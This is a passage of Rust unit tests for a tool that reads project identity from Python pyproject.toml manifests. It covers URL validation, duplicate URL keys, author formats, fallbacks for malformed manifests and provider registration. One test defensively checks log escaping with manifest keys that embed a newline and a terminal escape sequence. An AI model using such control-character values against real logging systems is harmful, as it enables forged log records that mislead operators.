        ] {
            let id = identity_from(&format!(
                r#"
[project]
name = "demo"
version = "1.0.0"

[project.urls]
Homepage = "{hostile}"
Repository = "{hostile}"
"#
            ));

            assert!(
                id.homepage.is_none(),
                "Homepage must drop for {hostile:?}, got: {:?}",
                id.homepage
            );
            assert!(
                id.repository.is_none(),
                "Repository must drop for {hostile:?}, got: {:?}",
                id.repository
            );
        }
    }

    /// SEC-11 / TASK-1755: a scheme-less value is rejected rather than
    /// guessed at — inventing `https://` would fabricate a link the manifest
    /// never declared. The repository slot has a git-remote fallback, so this
    /// pins the homepage slot where a rejection is directly observable.
    #[test]
    fn scheme_less_homepage_is_rejected() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"

[project.urls]
Homepage = "example.com/x"
"#,
        );

        assert!(id.homepage.is_none(), "got: {:?}", id.homepage);
    }

    /// PATTERN-1 / TASK-1062: PEP 621 distinguishes `Homepage` from
    /// `Documentation`. A pyproject with only a `Documentation` URL must NOT
    /// have its docs URL surfaced as the project homepage — the homepage
    /// field should fall through to None.
    #[test]
    fn documentation_only_url_does_not_become_homepage() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"

[project.urls]
Documentation = "https://docs.x"
"#,
        );

        assert!(
            id.homepage.is_none(),
            "Documentation must not be folded into homepage, got: {:?}",
            id.homepage
        );
    }

    /// PATTERN-1 / TASK-1110: two raw keys that collapse under
    /// `normalize_url_key` must keep the **first-seen** (`BTreeMap`-order)
    /// entry and warn, rather than letting a naive `.collect()` pick an
    /// arbitrary last-write-wins winner. TEST-5 / TASK-1757: reverting
    /// `normalize_urls` to `urls.iter().map(...).collect()` fails this test.
    #[test]
    fn colliding_url_keys_keep_the_first_seen_entry_and_warn() {
        let mut urls = std::collections::BTreeMap::new();
        // `normalize_url_key` lowercases and maps `-` to a space, so
        // "Home-Page" and "home page" both collapse to "home page".
        // BTreeMap order: "Home-Page" (uppercase H, 0x48) sorts before
        // "home page" (lowercase h, 0x68), so "Home-Page" is first-seen.
        urls.insert("Home-Page".to_string(), "https://first.dev".to_string());
        urls.insert("home page".to_string(), "https://second.dev".to_string());

        let (logs, picked) = capture_tracing(tracing::Level::WARN, || {
            pick_url(&normalize_urls(&urls), &["homepage", "home", "home-page"])
        });

        assert_eq!(picked.as_deref(), Some("https://first.dev"));
        assert!(
            logs.contains("first_key=\"Home-Page\""),
            "warn must name the first-seen raw key: {logs}"
        );
        assert!(
            logs.contains("duplicate_key=\"home page\""),
            "warn must name the colliding raw key: {logs}"
        );
        assert!(
            logs.contains("first_url=\"https://first.dev\""),
            "warn must carry the retained URL: {logs}"
        );
        assert!(
            logs.contains("duplicate_url=\"https://second.dev\""),
            "warn must carry the discarded URL: {logs}"
        );
        assert!(
            logs.contains("recovery=\"keep-first\""),
            "warn must state the recovery: {logs}"
        );
    }

    /// SEC-21: `normalize_url_key` only trims the *ends* of the key, so an
    /// interior newline or ESC survives into `norm`. The collision warn must
    /// therefore Debug-format `normalized_key` too — Display-formatting it
    /// would let a hostile `[project.urls]` key forge a log record.
    #[test]
    fn colliding_url_keys_escape_control_chars_in_the_normalized_key() {
        let mut urls = std::collections::BTreeMap::new();
        // Both collapse to "home\n\u{1b}[31m page" under `normalize_url_key`.
        urls.insert(
            "Home\n\u{1b}[31m-Page".to_string(),
            "https://first.dev".to_string(),
        );
        urls.insert(
            "home\n\u{1b}[31m page".to_string(),
            "https://second.dev".to_string(),
        );

        let (logs, _) = capture_tracing(tracing::Level::WARN, || normalize_urls(&urls));

        assert!(
            logs.contains("normalized_key="),
            "the collision warn must fire: {logs}"
        );
        assert!(
            logs.contains("normalized_key=\"home\\n\\u{1b}[31m page\""),
            "normalized_key must arrive Debug-escaped: {logs}"
        );
    }

    /// TEST-5 / TASK-1757: the same contract end to end, through a real
    /// manifest rather than a hand-built map.
    #[test]
    fn colliding_url_keys_in_a_manifest_keep_the_first_seen_homepage() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"

[project.urls]
Home-Page = "https://first.dev"
"home page" = "https://second.dev"
"#,
        );

        assert_eq!(id.homepage.as_deref(), Some("https://first.dev"));
    }

    #[test]
    fn fallback_to_dir_name_when_no_pyproject() {
        let dir = tempfile::tempdir().unwrap();
        let id = identity_at(dir.path());

        assert_eq!(id.stack_label, "Python");
        assert!(id.version.is_none());
        assert!(id.stack_detail.is_none());
    }

    /// TEST-5 / TASK-1756: the crate doc promises that a *malformed* manifest
    /// falls back to defaults *and* says so via `tracing::warn!`, so a broken
    /// manifest does not silently look like a missing one (TASK-0394 /
    /// TASK-0974). Both halves were previously unasserted — deleting the warn
    /// left the suite green.
    #[test]
    fn invalid_pyproject_falls_back_to_directory_name_and_warns() {
        let dir = tempfile::tempdir().unwrap();
        let manifest = dir.path().join("pyproject.toml");
        ops_about::test_support::write_file(&manifest, "[project\nname = \"demo\"\n");

        let (logs, id) = capture_tracing(tracing::Level::WARN, || identity_at(dir.path()));

        assert!(
            !id.name.is_empty(),
            "the directory-name fallback must still yield a name"
        );
        assert_ne!(id.name, "demo", "the broken manifest must not be trusted");
        assert!(id.version.is_none(), "got: {:?}", id.version);
        assert!(id.stack_detail.is_none(), "got: {:?}", id.stack_detail);
        assert!(
            logs.contains("recovery=\"default-identity\""),
            "warn must state the recovery: {logs}"
        );
        assert!(
            logs.contains("pyproject.toml"),
            "warn must name the manifest path: {logs}"
        );
    }

    /// PATTERN-1 / TASK-1774: `authors` written as a list of bare strings is
    /// the Poetry spelling and is common in the wild. It must not discard the
    /// rest of `[project]`, and the entries themselves are already in the
    /// rendered `Name <email>` shape.
    #[test]
    fn bare_string_authors_parse_and_keep_the_rest_of_the_project_table() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.2.3"
description = "A demo"
authors = ["Alice <a@x.com>", "Bob"]
"#,
        );

        assert_eq!(id.name, "demo");
        assert_eq!(id.version.as_deref(), Some("1.2.3"));
        assert_eq!(id.description.as_deref(), Some("A demo"));
        assert_eq!(id.authors, vec!["Alice <a@x.com>", "Bob"]);
    }

    /// PATTERN-1 / TASK-1774: a type mismatch on one `[project]` key must
    /// degrade that key alone — every other field still populates — and the
    /// failure must be visible in a warn naming the offending field path.
    #[test]
    fn one_malformed_project_field_degrades_only_that_field() {
        let dir = tempfile::tempdir().unwrap();
        ops_about::test_support::write_file(
            &dir.path().join("pyproject.toml"),
            r#"
[project]
name = "demo"
version = 3
description = "A demo"
requires-python = ">=3.11"
"#,
        );

        let (logs, id) = capture_tracing(tracing::Level::WARN, || identity_at(dir.path()));

        assert_eq!(id.name, "demo", "a sibling field must survive");
        assert_eq!(id.description.as_deref(), Some("A demo"));
        assert_eq!(id.stack_detail.as_deref(), Some("Python >=3.11"));
        assert!(id.version.is_none(), "got: {:?}", id.version);
        assert!(
            logs.contains("field=project.version"),
            "warn must name the offending field path: {logs}"
        );
        assert!(
            logs.contains("recovery=\"skip-field\""),
            "warn must state the recovery: {logs}"
        );
    }

    /// PATTERN-1 / TASK-1774: an author entry that is neither the PEP 621
    /// table nor a bare string is skipped, not fatal to the whole list.
    #[test]
    fn unsupported_author_entry_is_skipped_not_fatal() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "0.1.0"
authors = [{ name = "Alice" }, 42]
"#,
        );

        assert_eq!(id.name, "demo");
        assert_eq!(id.authors, vec!["Alice"]);
    }

    /// ERR-2 / TASK-0980: an email-only author renders as `<email>` so
    /// the python provider matches `extensions-node` `format_person`.
    /// Without the brackets, a bare email next to "Name <email>" entries
    /// renders ambiguously in a multi-author card.
    #[test]
    fn email_only_author_renders_with_angle_brackets() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "0.1.0"
authors = [
    { email = "a@example.com" },
]
"#,
        );

        assert_eq!(id.authors, vec!["<a@example.com>".to_string()]);
    }

    #[test]
    fn author_with_name_and_email() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "0.1.0"
authors = [
    { name = "Alice", email = "a@example.com" },
    { name = "Bob" },
]
"#,
        );

        assert_eq!(id.authors, vec!["Alice <a@example.com>", "Bob"]);
    }

    #[test]
    fn git_remote_fallback_when_no_repository_url() {
        let id = identity_from_with_files(
            r#"
[project]
name = "demo"
version = "0.1.0"
"#,
            &[(
                ".git/config",
                "[remote \"origin\"]\n\turl = https://github.com/o/r.git\n",
            )],
        );

        assert_eq!(id.repository.as_deref(), Some("https://github.com/o/r"));
    }

    /// TEST-5 / TASK-2201 AC #4: the `register_data_providers` closure in
    /// `impl_extension!` had no test — a dropped `registry.register` line
    /// (its result is discarded with `let _ =`) silently unregistered the
    /// packages card. Run the real closure and assert both providers land
    /// under distinct keys and each answers with its own payload shape.
    #[test]
    fn extension_registers_identity_and_units_providers() {
        use ops_extension::{DataRegistry, Extension};

        let mut registry = DataRegistry::new();
        AboutPythonExtension.register_data_providers(&mut registry);
        assert_eq!(
            registry.provider_names(),
            vec!["project_identity", "project_units"],
            "both providers must land under distinct keys"
        );

        // Distinct payloads prove distinct providers, not one key answering
        // twice: identity is a ProjectIdentity object, units an array.
        let dir = tempfile::tempdir().unwrap();
        ops_about::test_support::write_file(
            &dir.path().join("pyproject.toml"),
            r#"
[project]
name = "demo"
version = "0.1.0"

[tool.uv.workspace]
members = ["packages/alpha"]
"#,
        );
        ops_about::test_support::write_file(
            &dir.path().join("packages/alpha/pyproject.toml"),
            "[project]\nname = \"alpha\"\nversion = \"1.0.0\"\n",
        );
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let identity = registry
            .provide("project_identity", &mut ctx)
            .expect("identity provider must answer");
        assert_eq!(identity["stack_label"], serde_json::json!("Python"));
        let units = registry
            .provide("project_units", &mut ctx)
            .expect("units provider must answer");
        assert_eq!(
            units
                .as_array()
                .and_then(|a| a.first())
                .and_then(|u| u.get("name"))
                .and_then(serde_json::Value::as_str),
            Some("alpha"),
            "units payload must list the workspace member: {units}"
        );
    }
}
